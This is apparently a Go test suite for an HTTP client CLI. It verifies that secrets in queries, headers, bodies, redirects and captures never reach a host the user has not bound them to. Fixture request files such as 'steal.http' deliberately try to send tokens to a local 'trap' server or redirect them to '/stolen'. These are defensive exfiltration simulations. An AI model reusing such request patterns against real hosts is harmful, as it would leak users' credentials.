package cli

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync"
	"sync/atomic"
	"testing"

	"github.com/vidforull/vegtam/internal/core/history"
	"github.com/vidforull/vegtam/internal/core/output"
)

// Invariant 20: a .http file or a public environment file from someone
// else, a cloned repository or a prompt injection, must not send a secret
// to a new host. The tests of this file run vegtam as a person and as a
// program would, with each kind of secret in each part of a request,
// against two servers: a, the one the person has bound the secrets to,
// and a trap, which nothing may reach unless a person confirms it.

// The secrets of these tests. "/" and "+" give them distinct escaped
// forms; cmdSecret, of trust_test.go, is what {{$cmd TRAP}} prints.
const (
	trapToken    = "Tr4pT0k/en+x"   // {{token}}, private, bound to a by $allow
	trapPolicy   = "P0l1cyK3y/v+al" // {{$env VEGTAM_TRAP_POLICY}}, bound to a by the policy
	trapForeign  = "F0re1gnK3y/v+a" // {{$env VEGTAM_TRAP_FOREIGN}}, which only a file from someone else binds
	trapSession  = "S3ss10nTr/4p+s" // {{session}}, captured from a response of a
	trapNone     = "N0b1nd/K3y+v"   // {{$env VEGTAM_TRAP_NONE}}, bound to nothing
	trapLoose    = "L00se/Pr1v+v"   // {{loose}}, private, bound to nothing
	trapPassword = "B4s1cPa/55+w"   // {{password}}, private, bound to a
)

// trapServer is a server that records the requests it gets, counting the
// connections it accepts and the bytes it reads.
type trapServer struct {
	*httptest.Server
	conns, read atomic.Int64
	mu          sync.Mutex
	got         []string // each request: method, path and query, the headers, the body
}

// newTrapServer starts a trapServer that answers with handle, or with
// {"ok": true} if handle is nil.
func newTrapServer(t *testing.T, handle http.HandlerFunc) *trapServer {
	t.Helper()
	s := &trapServer{}
	s.Server = httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		body, _ := io.ReadAll(r.Body)
		s.mu.Lock()
		s.got = append(s.got, fmt.Sprintf("%s %s %v %s", r.Method, r.URL.RequestURI(), r.Header, body))
		s.mu.Unlock()
		if handle == nil {
			fmt.Fprint(w, `{"ok": true}`)
			return
		}
		handle(w, r)
	}))
	s.Listener = trapListener{s.Listener, s}
	s.Start()
	t.Cleanup(s.Close)
	return s
}

func (s *trapServer) requests() []string {
	s.mu.Lock()
	defer s.mu.Unlock()
	return slices.Clone(s.got)
}

// untouched fails the test if the trap has heard anything at all.
func (s *trapServer) untouched(t *testing.T) {
	t.Helper()
	if c, n := s.conns.Load(), s.read.Load(); c != 0 || n != 0 {
		t.Errorf("the trap took %d connections and read %d bytes: %q", c, n, s.requests())
	}
}

type trapListener struct {
	net.Listener
	s *trapServer
}

func (l trapListener) Accept() (net.Conn, error) {
	c, err := l.Listener.Accept()
	if err != nil {
		return nil, err
	}
	l.s.conns.Add(1)
	return trapConn{c, l.s}, nil
}

type trapConn struct {
	net.Conn
	s *trapServer
}

func (c trapConn) Read(b []byte) (int, error) {
	n, err := c.Conn.Read(b)
	c.s.read.Add(int64(n))
	return n, err
}

// trapFixture is a directory of requests from someone else, with the
// environment files, the command file and the policy of the person who
// runs them.
type trapFixture struct {
	dir     string
	a, trap *trapServer
}

// newTrapFixture writes the files of the person: the policy binds
// {{$env VEGTAM_TRAP_POLICY}} and {{$cmd TRAP}} to a, the private
// environment file binds {{token}} and {{password}} to a, and {{user}} to
// a and the trap. The public file, which comes with the requests, names
// the servers. a signs in with POST /login, which hands out a session and
// the id 7, echoes the X-Value header of /echo, and redirects /away to
// the trap, query and all.
func newTrapFixture(t *testing.T) *trapFixture {
	t.Helper()
	fx := &trapFixture{dir: t.TempDir()}
	fx.trap = newTrapServer(t, nil)
	fx.a = newTrapServer(t, func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/login":
			fmt.Fprintf(w, `{"session": %q, "id": "7"}`, trapSession)
		case "/echo":
			fmt.Fprintf(w, `{"echo": %q}`, r.Header.Get("X-Value"))
		case "/away":
			http.Redirect(w, r, fx.trap.URL+"/stolen?"+r.URL.RawQuery, http.StatusFound)
		default:
			fmt.Fprint(w, `{"ok": true}`)
		}
	})
	a, trap := fx.a.URL, fx.trap.URL
	policy, _ := json.Marshal(map[string]any{
		"network": map[string]any{"allow": []string{"127.0.0.1"}, "confirm": "never"},
		"secrets": map[string]any{"env": map[string][]string{"VEGTAM_TRAP_POLICY": {a}}, "cmd": map[string][]string{"TRAP": {a}}, "unattended": "keeper"},
	})
	writePolicy(t, string(policy))
	cmds, _ := json.Marshal(map[string]any{"TRAP": map[string]any{"argv": []string{os.Args[0], "-test.run=^TestHelperProcess$"}}})
	files := map[string]any{
		"http-client.env.json": map[string]any{"test": map[string]string{"a": a, "trap": trap}},
		"http-client.private.env.json": map[string]any{"test": map[string]any{
			"token": trapToken, "loose": trapLoose, "user": "alice", "password": trapPassword,
			"$allow": map[string][]string{"token": {a}, "password": {a}, "user": {a, trap}},
		}},
		"http-client.cmd.json": json.RawMessage(cmds),
	}
	for name, v := range files {
		b, _ := json.Marshal(v)
		if err := os.WriteFile(filepath.Join(fx.dir, name), b, 0o600); err != nil {
			t.Fatal(err)
		}
	}
	t.Setenv("VEGTAM_TRAP_POLICY", trapPolicy)
	t.Setenv("VEGTAM_TRAP_FOREIGN", trapForeign)
	t.Setenv("VEGTAM_TRAP_NONE", trapNone)
	t.Setenv("VEGTAM_TEST_HELPER", "1")
	t.Setenv("GORACE", "atexit_sleep_ms=0") // a helper built with -race would wait a second
	if code, _, stderr := runAt(t, "trust", fx.dir); code != exitOK {
		t.Fatalf("trust = %d: %s", code, stderr)
	}
	return fx
}

// write writes src as the .http file name and returns its path.
func (fx *trapFixture) write(t *testing.T, name, src string) string {
	t.Helper()
	path := filepath.Join(fx.dir, name)
	if err := os.WriteFile(path, []byte(src), 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}

// trapLeaks returns the forms of the secrets of these tests that s
// contains: each value, escaped for a URL or JSON, in base64, and its
// first four characters, which is what a cut-off value would leave.
func trapLeaks(s string) []string {
	var found []string
	basic := "alice:" + trapPassword
	for _, f := range []string{basic, base64.StdEncoding.EncodeToString([]byte(basic))} {
		if strings.Contains(s, f) {
			found = append(found, f)
		}
	}
	for _, secret := range []string{trapToken, trapPolicy, trapForeign, trapSession, trapNone, trapLoose, trapPassword, cmdSecret} {
		j, _ := json.Marshal(secret)
		for _, f := range []string{
			secret, url.QueryEscape(secret), url.PathEscape(secret), string(j[1 : len(j)-1]),
			strings.ReplaceAll(secret, "/", `\/`), strings.ReplaceAll(secret, "+", `\u002B`), secret[:4],
			base64.StdEncoding.EncodeToString([]byte(secret)), base64.RawURLEncoding.EncodeToString([]byte(secret)),
		} {
			if strings.Contains(s, f) {
				found = append(found, f)
			}
		}
	}
	return found
}

// trapKind is a kind of secret: its placeholder, its value, where the
// person has bound it, and what a request needs before it to have one.
type trapKind struct {
	name, placeholder, value string
	captured                 bool
	before                   string // requests that come first in the file
}

func trapKinds() []trapKind {
	return []trapKind{
		{name: "private", placeholder: "{{token}}", value: trapToken},
		{name: "env-policy", placeholder: "{{$env VEGTAM_TRAP_POLICY}}", value: trapPolicy},
		{name: "cmd", placeholder: "{{$cmd TRAP}}", value: cmdSecret},
		{
			name: "captured", placeholder: "{{session}}", value: trapSession, captured: true,
			before: "# @name login\n# @capture session = $.session\nPOST {{a}}/login\n\n###\n",
		},
	}
}

// trapPlaces are the parts of a request a secret goes in, each a request
// named send to the base URL host.
var trapPlaces = []struct {
	name    string
	request func(host, secret string) string
}{
	{"query", func(host, secret string) string { return "# @name send\nGET " + host + "/q?v=" + secret + "\n" }},
	{"header", func(host, secret string) string { return "# @name send\nGET " + host + "/h\nX-Value: " + secret + "\n" }},
	{"body", func(host, secret string) string {
		return "# @name send\nPOST " + host + "/b\nContent-Type: application/json\n\n{\"t\": \"" + secret + "\"}\n"
	}},
}

// lastResult returns the result of the last request of a run whose
// output is stdout, a JSON document.
func lastResult(t *testing.T, stdout string) *output.Result {
	t.Helper()
	validateJSON(t, stdout)
	var doc output.Document
	decode(t, stdout, &doc)
	if doc.Result != nil {
		return doc.Result
	}
	if len(doc.Results) == 0 {
		t.Fatalf("no result in %s", stdout)
	}
	return doc.Results[len(doc.Results)-1]
}

// wantSecret checks that s says the secret named name may not go to
// origin, and may go to allowed alone.
func wantSecret(t *testing.T, what string, s *output.Secret, name, origin string, captured bool, allowed ...string) {
	t.Helper()
	if allowed == nil {
		allowed = []string{}
	}
	if s == nil || s.Name != name || s.Origin != origin || !slices.Equal(s.Allowed, allowed) || s.Captured != captured {
		t.Errorf("%s: secret %+v; want %s to %s, allowed %q, captured %v", what, s, name, origin, allowed, captured)
	}
}

// TestInvariant20 sends each kind of secret, in each part of a request,
// to the origin the person bound it to, where it goes, and to the trap:
// without a person at a terminal it is an error of kind policy, exit
// code 6, that no --confirm lifts; with one, exit code 5 until they
// confirm that request by its ref (TestInvariant20Confirmed), not with
// --confirm alone. The trap hears nothing of a request refused, and no
// secret value shows in what vegtam prints.
func TestInvariant20(t *testing.T) {
	fx := newTrapFixture(t)
	for _, k := range trapKinds() {
		for _, place := range trapPlaces {
			t.Run(k.name+"/"+place.name, func(t *testing.T) {
				toA := fx.write(t, k.name+"-"+place.name+"-a.http", k.before+place.request("{{a}}", k.placeholder))
				toTrap := fx.write(t, k.name+"-"+place.name+"-trap.http", k.before+place.request("{{trap}}", k.placeholder))
				ref := toTrap + "#send"
				outputs := ""

				// To a, it goes, with a person or not.
				from := len(fx.a.requests())
				code, stdout, stderr := runCLI(t, false, "run", toA, "-e", "test")
				outputs += stdout + stderr
				if res := lastResult(t, stdout); code != exitOK || res.Error != nil {
					t.Errorf("to a: %d, %+v", code, res.Error)
				}
				code, stdout, stderr = runAt(t, "run", toA, "-e", "test")
				outputs += stdout + stderr
				if code != exitOK {
					t.Errorf("to a, a person: %d\n%s", code, stderr)
				}
				got := fx.a.requests()[from:]
				if n := len(got); n == 0 || !strings.Contains(got[n-1], k.value) {
					t.Errorf("a got %q, want the secret value", got)
				}

				// To the trap: refused, without a person whatever confirms it.
				allowed := fx.a.URL
				for _, extra := range [][]string{nil, {"--confirm"}, {"--confirm=" + ref}} {
					code, stdout, stderr = runCLI(t, false, append([]string{"run", toTrap, "-e", "test"}, extra...)...)
					outputs += stdout + stderr
					res := lastResult(t, stdout)
					if code != exitPolicy || res.Error == nil || res.Error.Kind != "policy" || res.Response != nil || res.Error.Confirm != nil {
						t.Errorf("to the trap %q: %d, %+v", extra, code, res.Error)
						continue
					}
					wantSecret(t, fmt.Sprint(extra), res.Error.Secret, k.placeholder, fx.trap.URL, k.captured, allowed)
					if want := "is not sent: secret " + k.placeholder + " may not go to " + fx.trap.URL; !strings.Contains(res.Error.Message, want) {
						t.Errorf("to the trap %q: %s; want %q", extra, res.Error.Message, want)
					}
				}
				// With a person, until they confirm that request: --confirm
				// alone confirms the run before its requests are seen.
				for _, extra := range [][]string{nil, {"--confirm"}} {
					code, stdout, stderr = runAt(t, append([]string{"run", toTrap, "-e", "test"}, extra...)...)
					outputs += stdout + stderr
					if want := "is not sent without a confirmation: secret " + k.placeholder + " may not go to " + fx.trap.URL; code != exitConfirm ||
						!strings.Contains(stderr, want) || !strings.Contains(stderr, "; or --confirm="+ref+" sends it this once\n") {
						t.Errorf("to the trap, a person %q: %d\n%s", extra, code, stderr)
					}
				}
				// A dry run sends nothing, and says why it would not.
				code, stdout, stderr = runCLI(t, false, "run", toTrap, "-e", "test", "--dry-run")
				outputs += stdout + stderr
				res := lastResult(t, stdout)
				if code != exitPolicy || res.Error == nil || res.Error.Kind != "policy" || len(res.SecretOrigins) != 1 {
					t.Errorf("dry run: %d, %+v, %+v", code, res.Error, res.SecretOrigins)
				} else {
					wantSecret(t, "dry run", res.Error.Secret, k.placeholder, fx.trap.URL, k.captured, allowed)
					wantSecret(t, "dry run", &res.SecretOrigins[0], k.placeholder, fx.trap.URL, k.captured, allowed)
				}
				code, stdout, stderr = runAt(t, "run", toTrap, "-e", "test", "--dry-run")
				outputs += stdout + stderr
				if code != exitOK || !strings.Contains(stdout, "sending it needs --confirm="+ref+": ") || !strings.Contains(stdout, k.placeholder) {
					t.Errorf("dry run, a person: %d\n%s\n%s", code, stdout, stderr)
				}
				fx.trap.untouched(t)
				if found := trapLeaks(outputs); len(found) > 0 {
					t.Errorf("secret forms %q in the output\n%s", found, outputs)
				}
			})
		}
	}
}

// TestInvariant20Confirmed checks that a person who confirms the request
// sends the secret to the trap, once, and nothing else: each kind of
// secret, each part, with a trap of its own.
func TestInvariant20Confirmed(t *testing.T) {
	fx := newTrapFixture(t)
	for _, k := range trapKinds() {
		for _, place := range trapPlaces {
			t.Run(k.name+"/"+place.name, func(t *testing.T) {
				trap := newTrapServer(t, nil)
				file := fx.write(t, k.name+"-"+place.name+"-confirmed.http", k.before+place.request(trap.URL, k.placeholder))
				code, stdout, stderr := runAt(t, "run", file, "-e", "test", "--confirm="+file+"#send")
				if code != exitOK {
					t.Errorf("confirmed: %d\n%s", code, stderr)
				}
				if got := trap.requests(); len(got) != 1 || !strings.Contains(got[0], k.value) {
					t.Errorf("the trap got %q, want the one request confirmed", got)
				}
				if found := trapLeaks(stdout + stderr); len(found) > 0 {
					t.Errorf("secret forms %q in the output\n%s\n%s", found, stdout, stderr)
				}
			})
		}
	}
}

// TestInvariant20Unbound checks that a secret bound to no origin goes
// nowhere, not even to a: a private value the private file does not
// bind, and an environment variable that neither binds.
func TestInvariant20Unbound(t *testing.T) {
	fx := newTrapFixture(t)
	for _, placeholder := range []string{"{{loose}}", "{{$env VEGTAM_TRAP_NONE}}"} {
		file := fx.write(t, "unbound.http", "# @name send\nGET {{a}}/?v="+placeholder+"\n")
		from := len(fx.a.requests())
		code, stdout, stderr := runCLI(t, false, "run", file, "-e", "test", "--confirm")
		res := lastResult(t, stdout)
		if code != exitPolicy || res.Error == nil || res.Error.Kind != "policy" || !strings.Contains(res.Error.Message, "it is bound to no origin") {
			t.Errorf("%s: %d, %+v", placeholder, code, res.Error)
		} else {
			wantSecret(t, placeholder, res.Error.Secret, placeholder, fx.a.URL, false)
		}
		code, stdout2, stderr2 := runAt(t, "run", file, "-e", "test")
		if code != exitConfirm || !strings.Contains(stderr2, "secret "+placeholder+" may not go to "+fx.a.URL+": it is bound to no origin") {
			t.Errorf("%s, a person: %d\n%s", placeholder, code, stderr2)
		}
		if got := fx.a.requests()[from:]; len(got) != 0 {
			t.Errorf("%s: a got %q", placeholder, got)
		}
		if found := trapLeaks(stdout + stderr + stdout2 + stderr2); len(found) > 0 {
			t.Errorf("%s: secret forms %q in the output", placeholder, found)
		}
	}
}

// TestSecretOriginsRedirect checks a redirect from a to the trap: of a
// request with a secret in its URL, refused before the trap hears of it,
// a person's confirmation or not; of one with the secret in a header
// alone, followed without the header.
func TestSecretOriginsRedirect(t *testing.T) {
	fx := newTrapFixture(t)
	query := fx.write(t, "away.http", "# @name away\nGET {{a}}/away?v={{token}}\n")
	for _, run := range []func() (int, string, string){
		func() (int, string, string) { return runCLI(t, false, "run", query, "-e", "test", "--confirm") },
		func() (int, string, string) { return runAt(t, "run", query, "-e", "test", "--confirm="+query+"#away") },
	} {
		code, stdout, stderr := run()
		if code != exitPolicy || !strings.Contains(stderr, "refused a redirect to "+fx.trap.URL+" of a URL that holds a secret: secret {{token}} may not go to "+fx.trap.URL) {
			t.Errorf("a secret in the query: %d\n%s\n%s", code, stdout, stderr)
		}
		if found := trapLeaks(stdout + stderr); len(found) > 0 {
			t.Errorf("secret forms %q in the output", found)
		}
	}
	_, stdout, _ := runCLI(t, false, "run", query, "-e", "test")
	if res := lastResult(t, stdout); res.Error == nil || res.Error.Kind != "policy" {
		t.Errorf("a secret in the query: %+v", res.Error)
	} else {
		wantSecret(t, "redirect", res.Error.Secret, "{{token}}", fx.trap.URL, false, fx.a.URL)
	}
	fx.trap.untouched(t)

	// In a header alone: the redirect is followed, the header dropped.
	header := fx.write(t, "header.http", "# @name away\nGET {{a}}/away?plain=1\nX-Value: {{token}}\nAuthorization: Bearer {{token}}\n")
	code, stdout, stderr := runCLI(t, false, "run", header, "-e", "test")
	if res := lastResult(t, stdout); code != exitOK || res.Error != nil || len(res.Redirects) != 1 {
		t.Errorf("a secret in a header: %d, %+v\n%s", code, res.Error, stderr)
	}
	if got := fx.trap.requests(); len(got) != 1 || !strings.HasPrefix(got[0], "GET /stolen?plain=1 ") || strings.Contains(got[0], trapToken) ||
		strings.Contains(got[0], "X-Value") || strings.Contains(got[0], "Authorization") {
		t.Errorf("the trap got %q", got)
	}
}

// TestSecretOriginsCaptures checks the values a response gives: a secret
// one goes back to its origin alone, and so does a plain one that holds a
// secret value, as a response that echoes the request holds it.
func TestSecretOriginsCaptures(t *testing.T) {
	fx := newTrapFixture(t)
	file := fx.write(t, "echo.http", "# @name echo\n# @capture plain echoed = $.echo\nGET {{a}}/echo\nX-Value: {{token}}\n\n"+
		"###\n# @name back\nGET {{a}}/?e={{echoed}}\n\n###\n# @name send\nGET {{trap}}/?e={{echoed}}\n")
	code, stdout, stderr := runCLI(t, false, "run", file, "-e", "test")
	validateJSON(t, stdout)
	var doc output.Document
	decode(t, stdout, &doc)
	if code != exitPolicy || len(doc.Results) != 3 || len(doc.Results[0].Captures) != 1 || !doc.Results[0].Captures[0].Secret ||
		doc.Results[1].Error != nil || doc.Results[2].Error == nil || doc.Results[2].Error.Kind != "policy" {
		t.Fatalf("run = %d\n%s\n%s", code, stdout, stderr)
	}
	wantSecret(t, "echoed", doc.Results[2].Error.Secret, "{{echoed}}", fx.trap.URL, true, fx.a.URL)
	if got := fx.a.requests(); len(got) != 2 || !strings.HasPrefix(got[1], "GET /?e="+url.QueryEscape(trapToken)+" ") && !strings.HasPrefix(got[1], "GET /?e="+trapToken+" ") {
		t.Errorf("a got %q", got)
	}
	// A plain value that holds none goes anywhere.
	plain := newTrapServer(t, nil)
	file = fx.write(t, "plain.http", "# @name login\n# @capture plain id = $.ok\nPOST {{a}}/\n\n###\n# @name send\nGET "+plain.URL+"/?id={{id}}\n")
	if code, _, errOut := runCLI(t, false, "run", file, "-e", "test"); code != exitOK || len(plain.requests()) != 1 {
		t.Errorf("a plain capture: %d, %q\n%s", code, plain.requests(), errOut)
	}
	if found := trapLeaks(stdout + stderr); len(found) > 0 {
		t.Errorf("secret forms %q in the output", found)
	}
	fx.trap.untouched(t)
}

// TestSecretOriginsBasic checks Basic written as user and password: it
// goes where both may go, and is refused where one of them may not.
func TestSecretOriginsBasic(t *testing.T) {
	fx := newTrapFixture(t)
	file := fx.write(t, "basic.http", "# @name a\nGET {{a}}/basic\nAuthorization: Basic {{user}} {{password}}\n\n"+
		"###\n# @name trap\nGET {{trap}}/basic\nAuthorization: Basic {{user}} {{password}}\n")
	code, stdout, stderr := runCLI(t, false, "run", file, "-e", "test")
	validateJSON(t, stdout)
	var doc output.Document
	decode(t, stdout, &doc)
	if code != exitPolicy || len(doc.Results) != 2 || doc.Results[0].Error != nil || doc.Results[1].Error == nil {
		t.Fatalf("run = %d\n%s", code, stdout)
	}
	wantSecret(t, "Basic", doc.Results[1].Error.Secret, "{{password}}", fx.trap.URL, false, fx.a.URL)
	if got := fx.a.requests(); len(got) != 1 || !strings.Contains(got[0], "Basic "+base64.StdEncoding.EncodeToString([]byte("alice:"+trapPassword))) {
		t.Errorf("a got %q", got)
	}
	if found := trapLeaks(stdout + stderr); len(found) > 0 {
		t.Errorf("secret forms %q in the output", found)
	}
	fx.trap.untouched(t)
}

// TestSecretOriginsHistory checks that the history keeps a request
// refused for its secrets, as policy or confirm, and none of its values.
func TestSecretOriginsHistory(t *testing.T) {
	file := historyOn(t)
	fx := newTrapFixture(t)
	steal := fx.write(t, "steal.http", "# @name send\nGET {{trap}}/?t={{token}}\n")
	runCLI(t, false, "run", steal, "-e", "test")
	runAt(t, "run", steal, "-e", "test")
	b, err := os.ReadFile(file)
	if err != nil {
		t.Fatal(err)
	}
	var results []string
	for line := range strings.Lines(string(b)) {
		var e history.Entry
		if err := json.Unmarshal([]byte(line), &e); err != nil {
			t.Fatal(err)
		}
		results = append(results, e.Result)
		if e.URL != "{{trap}}/?t={{token}}" || e.Status != 0 {
			t.Errorf("entry %+v", e)
		}
	}
	if !slices.Equal(results, []string{"policy", "confirm"}) {
		t.Errorf("results %q\n%s", results, b)
	}
	if found := trapLeaks(string(b)); len(found) > 0 {
		t.Errorf("secret forms %q in the history", found)
	}
	fx.trap.untouched(t)
}

// TestInvariant20Foreign checks the files a repository from someone else
// may bring along with its requests. Its private environment file binds
// its own values where it likes, but not the machine's: an $allow for
// {{$env NAME}} or {{$cmd NAME}} is ignored, with a warning, and so is
// the $allow of a public environment file.
func TestInvariant20Foreign(t *testing.T) {
	fx := newTrapFixture(t)
	theirs := newTrapServer(t, nil) // the repository's own server
	dir := filepath.Join(fx.dir, "foreign")
	if err := os.Mkdir(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	trap := fx.trap.URL
	private, _ := json.Marshal(map[string]any{"test": map[string]any{
		"own": "their-own-value",
		"$allow": map[string][]string{
			"own": {theirs.URL}, "$env VEGTAM_TRAP_FOREIGN": {trap}, "$env VEGTAM_TRAP_POLICY": {trap}, "$cmd TRAP": {trap},
		},
	}})
	requests := "# @name foreign\nGET {{trap}}/?k={{$env VEGTAM_TRAP_FOREIGN}}\n\n" +
		"###\n# @name policy\nGET {{trap}}/?k={{$env VEGTAM_TRAP_POLICY}}\n\n" +
		"###\n# @name cmd\nGET {{trap}}/?k={{$cmd TRAP}}\n\n" +
		"###\n# @name own\nGET " + theirs.URL + "/?o={{own}}\n"
	for name, data := range map[string]string{"http-client.private.env.json": string(private), "steal.http": requests} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(data), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	file := filepath.Join(dir, "steal.http")
	want := []struct {
		name, placeholder string
		allowed           []string
	}{
		{"foreign", "{{$env VEGTAM_TRAP_FOREIGN}}", nil},
		{"policy", "{{$env VEGTAM_TRAP_POLICY}}", []string{fx.a.URL}},
		{"cmd", "{{$cmd TRAP}}", []string{fx.a.URL}},
	}
	for _, extra := range [][]string{nil, {"--confirm"}} {
		code, stdout, stderr := runCLI(t, false, append([]string{"run", file, "-e", "test"}, extra...)...)
		validateJSON(t, stdout)
		var doc output.Document
		decode(t, stdout, &doc)
		if code != exitPolicy || len(doc.Results) != 4 || doc.Results[3].Error != nil {
			t.Fatalf("run %q = %d\n%s\n%s", extra, code, stdout, stderr)
		}
		for i, w := range want {
			if e := doc.Results[i].Error; e == nil || e.Kind != "policy" {
				t.Errorf("%s %q: %+v", w.name, extra, e)
			} else {
				wantSecret(t, w.name, e.Secret, w.placeholder, trap, false, w.allowed...)
			}
		}
		for _, w := range []string{"test.$allow.$env VEGTAM_TRAP_FOREIGN is ignored", "test.$allow.$env VEGTAM_TRAP_POLICY is ignored", "test.$allow.$cmd TRAP is ignored"} {
			if !strings.Contains(stderr, w) {
				t.Errorf("run %q: no warning %q\n%s", extra, w, stderr)
			}
		}
		if found := trapLeaks(stdout + stderr); len(found) > 0 {
			t.Errorf("secret forms %q in the output", found)
		}
	}
	for _, w := range want {
		code, _, stderr := runAt(t, "run", file+"#"+w.name, "-e", "test")
		if code != exitConfirm || !strings.Contains(stderr, "secret "+w.placeholder+" may not go to "+trap) {
			t.Errorf("%s, a person: %d\n%s", w.name, code, stderr)
		}
	}
	fx.trap.untouched(t)
	if got := theirs.requests(); len(got) != 2 || !strings.HasPrefix(got[0], "GET /?o=their-own-value ") {
		t.Errorf("their server got %q, want their own value twice", got)
	}

	// The $allow of a public environment file binds nothing.
	public := filepath.Join(fx.dir, "public")
	if err := os.Mkdir(public, 0o700); err != nil {
		t.Fatal(err)
	}
	env, _ := json.Marshal(map[string]any{"test": map[string]any{"trap": trap, "$allow": map[string][]string{"token": {trap}}}})
	for name, data := range map[string]string{"http-client.env.json": string(env), "steal.http": "GET {{trap}}/?t={{token}}\n"} {
		if err := os.WriteFile(filepath.Join(public, name), []byte(data), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	code, stdout, stderr := runCLI(t, false, "run", filepath.Join(public, "steal.http"), "-e", "test", "--confirm")
	if res := lastResult(t, stdout); code != exitPolicy || res.Error == nil || !strings.Contains(stderr, "test.$allow is ignored") {
		t.Errorf("a public $allow: %d\n%s\n%s", code, stdout, stderr)
	} else {
		wantSecret(t, "a public $allow", res.Error.Secret, "{{token}}", trap, false, fx.a.URL)
	}
	fx.trap.untouched(t)
}

// TestSecretOriginsDryRunCaptures checks what a dry run says of a value
// that a request would capture and the next would send to the trap: a
// plain one is no secret, and goes; a secret one goes back to a alone.
func TestSecretOriginsDryRunCaptures(t *testing.T) {
	fx := newTrapFixture(t)
	for _, tt := range []struct {
		capture string
		code    int
	}{{"plain id", exitOK}, {"id", exitPolicy}} {
		file := fx.write(t, "dry.http", "# @name login\n# @capture "+tt.capture+" = $.id\nPOST {{a}}/login\n\n###\n# @name send\nGET {{trap}}/items/{{id}}\n")
		code, stdout, stderr := runCLI(t, false, "run", file, "-e", "test", "--dry-run")
		res := lastResult(t, stdout)
		switch {
		case code != tt.code:
			t.Errorf("@capture %s: %d\n%s\n%s", tt.capture, code, stdout, stderr)
		case tt.code == exitOK && (res.Error != nil || res.SecretOrigins != nil):
			t.Errorf("@capture %s: %+v, %+v", tt.capture, res.Error, res.SecretOrigins)
		case tt.code == exitPolicy && (res.Error == nil || len(res.SecretOrigins) != 1):
			t.Errorf("@capture %s: %+v, %+v", tt.capture, res.Error, res.SecretOrigins)
		case tt.code == exitPolicy:
			wantSecret(t, tt.capture, res.Error.Secret, "{{id}}", fx.trap.URL, true, fx.a.URL)
			wantSecret(t, tt.capture, &res.SecretOrigins[0], "{{id}}", fx.trap.URL, true, fx.a.URL)
		}
	}
	fx.trap.untouched(t)
	if n := fx.a.conns.Load(); n != 0 {
		t.Errorf("a dry run made %d connections", n)
	}
}

// TestSecretOriginsSecretHost checks that a refusal does not tell the
// host of a secret base URL, however the person wrote it: the origin
// vegtam compares is in lower case, without a final dot.
func TestSecretOriginsSecretHost(t *testing.T) {
	fx := newTrapFixture(t)
	port := fx.trap.URL[strings.LastIndex(fx.trap.URL, ":")+1:]
	for _, base := range []string{"http://LocalHost:" + port + "/v1", "http://localhost.:" + port + "/v1"} {
		private, _ := json.Marshal(map[string]any{"test": map[string]any{"base": base, "$allow": map[string][]string{"base": {fx.a.URL}}}})
		dir := filepath.Join(t.TempDir(), "secret-host")
		if err := os.MkdirAll(dir, 0o700); err != nil {
			t.Fatal(err)
		}
		for name, data := range map[string]string{"http-client.private.env.json": string(private), "base.http": "GET {{base}}/x\n"} {
			if err := os.WriteFile(filepath.Join(dir, name), []byte(data), 0o600); err != nil {
				t.Fatal(err)
			}
		}
		for _, run := range []func() (int, string, string){
			func() (int, string, string) {
				return runCLI(t, false, "run", filepath.Join(dir, "base.http"), "-e", "test")
			},
			// A dry run without a person holds no value: where the request
			// goes is not known before it is sent.
			func() (int, string, string) {
				code, stdout, stderr := runCLI(t, false, "run", filepath.Join(dir, "base.http"), "-e", "test", "--dry-run")
				if code == exitOK && strings.Contains(stdout, `"secret_origins":[{"name":"{{base}}","allowed"`) {
					code = exitPolicy
				}
				return code, stdout, stderr
			},
			func() (int, string, string) { return runAt(t, "run", filepath.Join(dir, "base.http"), "-e", "test") },
		} {
			code, stdout, stderr := run()
			if code != exitPolicy && code != exitConfirm {
				t.Errorf("%s: %d\n%s\n%s", base, code, stdout, stderr)
			}
			for _, part := range []string{"localhost", "LocalHost", port} {
				if strings.Contains(stdout+stderr, part) {
					t.Errorf("%s: %q in the output\n%s\n%s", base, part, stdout, stderr)
				}
			}
		}
	}
	fx.trap.untouched(t)
}
